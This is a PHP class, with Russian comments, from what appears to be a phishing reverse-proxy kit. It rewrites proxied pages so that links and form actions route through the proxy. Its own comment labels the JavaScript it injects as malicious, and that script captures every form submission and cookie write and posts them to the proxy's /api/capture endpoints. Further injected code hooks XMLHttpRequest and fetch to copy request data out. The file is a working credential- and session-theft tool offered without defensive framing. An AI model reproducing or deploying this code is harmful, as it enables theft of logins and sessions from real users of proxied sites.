<?php

namespace ReverseProxy;

use DOMDocument;
use DOMXPath;
use Monolog\Logger;

class ContentModifier
{
    private Logger $logger;
    private array $config;

    public function __construct(Logger $logger, array $config)
    {
        $this->logger = $logger;
        $this->config = $config;
    }

    public function modify(string $content, ?string $contentType = null): string
    {
        // Определяем тип контента, если он не указан
        if (!$contentType) {
            $contentType = $this->detectContentType($content);
        }

        // Модифицируем контент в зависимости от его типа
        if (strpos($contentType, 'text/html') !== false) {
            return $this->modifyHtml($content);
        } elseif (strpos($contentType, 'text/css') !== false) {
            return $this->modifyCss($content);
        } elseif (strpos($contentType, 'application/javascript') !== false || strpos($contentType, 'text/javascript') !== false) {
            return $this->modifyJavaScript($content);
        }

        // Если тип контента не поддерживается, возвращаем оригинальный контент
        return $content;
    }

    private function modifyHtml(string $html): string
    {
        // Проверяем, не пустой ли HTML
        if (empty(trim($html))) {
            return $html;
        }

        // Создаем DOMDocument для работы с HTML
        $dom = new DOMDocument();
        
        // Сохраняем исходную кодировку
        $charset = $this->detectCharset($html);
        
        // Подавляем ошибки при загрузке HTML
        libxml_use_internal_errors(true);
        
        // Загружаем HTML
        $dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', $charset), LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        
        // Создаем XPath для поиска элементов
        $xpath = new DOMXPath($dom);

        // Заменяем URL в атрибутах
        if ($this->config['content_modifier']['replace_urls']) {
            $this->replaceUrls($dom, $xpath);
        }

        // Внедряем вредоносный JavaScript
        if ($this->config['content_modifier']['inject_js']) {
            $this->injectJavaScript($dom);
        }

        // Перехватываем формы
        if ($this->config['content_modifier']['capture_forms']) {
            $this->captureForms($dom, $xpath);
        }

        // Получаем модифицированный HTML
        $modifiedHtml = $dom->saveHTML();
        
        // Восстанавливаем исходную кодировку
        if ($charset && $charset !== 'UTF-8') {
            $modifiedHtml = mb_convert_encoding($modifiedHtml, $charset, 'HTML-ENTITIES');
        }
        
        // Очищаем ошибки libxml
        libxml_clear_errors();
        
        return $modifiedHtml;
    }

    private function modifyCss(string $css): string
    {
        // Заменяем URL в CSS
        if ($this->config['content_modifier']['replace_urls']) {
            $css = preg_replace_callback('/url\([\'"]?(.*?)[\'"]?\)/i', function($matches) {
                $url = $matches[1];
                
                // Пропускаем data URL
                if (strpos($url, 'data:') === 0) {
                    return $matches[0];
                }
                
                // Заменяем URL
                $replacedUrl = $this->replaceUrl($url);
                
                return "url('$replacedUrl')";
            }, $css);
        }
        
        return $css;
    }

    private function modifyJavaScript(string $js): string
    {
        // Заменяем URL в JavaScript
        if ($this->config['content_modifier']['replace_urls']) {
            // Заменяем строковые литералы, содержащие URL
            $js = preg_replace_callback('/([\'"])(https?:\/\/[^\'"]+)([\'"])/i', function($matches) {
                $url = $matches[2];
                $replacedUrl = $this->replaceUrl($url);
                return $matches[1] . $replacedUrl . $matches[3];
            }, $js);
        }
        
        // Внедряем код для перехвата XHR и fetch запросов
        if ($this->config['content_modifier']['inject_js']) {
            $js = $this->injectXhrInterceptor($js);
        }
        
        return $js;
    }

    private function replaceUrls(DOMDocument $dom, DOMXPath $xpath): void
    {
        // Заменяем URL в атрибутах href и src
        $urlAttributes = ['href', 'src', 'action', 'data-src'];
        
        foreach ($urlAttributes as $attribute) {
            $elements = $xpath->query("//*[@$attribute]");
            
            foreach ($elements as $element) {
                $url = $element->getAttribute($attribute);
                
                // Пропускаем пустые URL, якоря и javascript:
                if (empty($url) || $url[0] === '#' || strpos($url, 'javascript:') === 0 || strpos($url, 'data:') === 0) {
                    continue;
                }
                
                // Заменяем URL
                $replacedUrl = $this->replaceUrl($url);
                $element->setAttribute($attribute, $replacedUrl);
            }
        }
    }

    private function replaceUrl(string $url): string
    {
        // Проверяем, является ли URL абсолютным
        if (strpos($url, 'http') !== 0 && $url[0] !== '/') {
            return $url;
        }
        
        // Для абсолютных URL заменяем домен на наш
        if (strpos($url, 'http') === 0) {
            $parsedUrl = parse_url($url);
            $path = $parsedUrl['path'] ?? '';
            $query = isset($parsedUrl['query']) ? '?' . $parsedUrl['query'] : '';
            $fragment = isset($parsedUrl['fragment']) ? '#' . $parsedUrl['fragment'] : '';
            
            // Формируем новый URL
            return '/proxy?url=' . urlencode($url) . $fragment;
        }
        
        // Для относительных URL добавляем префикс
        return $url;
    }

    private function injectJavaScript(DOMDocument $dom): void
    {
        // Создаем элемент script
        $script = $dom->createElement('script');
        
        // Устанавливаем содержимое скрипта
        $scriptContent = <<<'JS'
(function() {
    // Код для перехвата данных форм
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var formData = new FormData(form);
        var data = {};
        
        for (var pair of formData.entries()) {
            data[pair[0]] = pair[1];
        }
        
        // Отправляем данные на наш сервер
        fetch('/api/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                url: window.location.href,
                formAction: form.action,
                formMethod: form.method,
                data: data
            })
        });
    });
    
    // Код для перехвата cookies
    var originalCookie = document.cookie;
    Object.defineProperty(document, 'cookie', {
        get: function() {
            return originalCookie;
        },
        set: function(value) {
            originalCookie = value;
            
            // Отправляем cookie на наш сервер
            fetch('/api/capture/cookie', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    url: window.location.href,
                    cookie: value
                })
            });
        }
    });
    
    console.log('Proxy script injected');
})();
JS;
        
        $script->appendChild($dom->createTextNode($scriptContent));
        
        // Добавляем скрипт в конец body или в конец документа, если body отсутствует
        $body = $dom->getElementsByTagName('body')->item(0);
        
        if ($body) {
            $body->appendChild($script);
        } else {
            $dom->appendChild($script);
        }
    }

    private function injectXhrInterceptor(string $js): string
    {
        // Код для перехвата XHR и fetch запросов
        $interceptorCode = <<<'JS'
// Перехват XMLHttpRequest
(function() {
    var originalXhrOpen = XMLHttpRequest.prototype.open;
    var originalXhrSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._proxyUrl = url;
        this._proxyMethod = method;
        return originalXhrOpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
        var xhr = this;
        
        // Отправляем информацию о запросе на наш сервер
        fetch('/api/capture/xhr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                url: xhr._proxyUrl,
                method: xhr._proxyMethod,
                data: body
            })
        });
        
        return originalXhrSend.apply(this, arguments);
    };
    
    // Перехват fetch
    var originalFetch = window.fetch;
    
    window.fetch = function(resource, init) {
        // Отправляем информацию о запросе на наш сервер
        fetch('/api/capture/fetch', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                url: typeof resource === 'string' ? resource : resource.url,
                method: init && init.method ? init.method : 'GET',
                data: init && init.body ? init.body : null
            })
        });
        
        return originalFetch.apply(this, arguments);
    };
})();
JS;
        
        // Добавляем код перехватчика в начало JavaScript-файла
        return $interceptorCode . "\n\n" . $js;
    }

    private function captureForms(DOMDocument $dom, DOMXPath $xpath): void
    {
        // Находим все формы
        $forms = $xpath->query('//form');
        
        foreach ($forms as $form) {
            // Получаем атрибуты формы
            $action = $form->getAttribute('action');
            $method = $form->getAttribute('method') ?: 'get';
            
            // Модифицируем атрибут action
            if (!empty($action)) {
                $form->setAttribute('action', $this->replaceUrl($action));
            }
            
            // Добавляем обработчик события submit
            $form->setAttribute('onsubmit', 'return true;');
            
            // Добавляем скрытое поле для отслеживания
            $hiddenField = $dom->createElement('input');
            $hiddenField->setAttribute('type', 'hidden');
            $hiddenField->setAttribute('name', '_proxy_capture');
            $hiddenField->setAttribute('value', '1');
            
            $form->appendChild($hiddenField);
        }
    }

    private function detectContentType(string $content): string
    {
        // Проверяем, похож ли контент на HTML
        if (preg_match('/<html[^>]*>|<!DOCTYPE html>/i', $content)) {
            return 'text/html';
        }
        
        // Проверяем, похож ли контент на CSS
        if (preg_match('/[\s\{]*([\w\-]+)\s*\{[^\}]*\}/i', $content)) {
            return 'text/css';
        }
        
        // Проверяем, похож ли контент на JavaScript
        if (preg_match('/function\s+[\w\$]+\s*\(|var\s+[\w\$]+\s*=|const\s+[\w\$]+\s*=|let\s+[\w\$]+\s*=/i', $content)) {
            return 'application/javascript';
        }
        
        // По умолчанию считаем контент текстом
        return 'text/plain';
    }

    private function detectCharset(string $html): string
    {
        // Проверяем наличие метатега с указанием кодировки
        if (preg_match('/<meta[^>]+charset=[\'"]*([^\'"\/]+)/i', $html, $matches)) {
            return $matches[1];
        }
        
        // Проверяем наличие XML-декларации с указанием кодировки
        if (preg_match('/<\?xml[^>]+encoding=[\'"]*([^\'"\/]+)/i', $html, $matches)) {
            return $matches[1];
        }
        
        // По умолчанию считаем, что контент в UTF-8
        return 'UTF-8';
    }
}
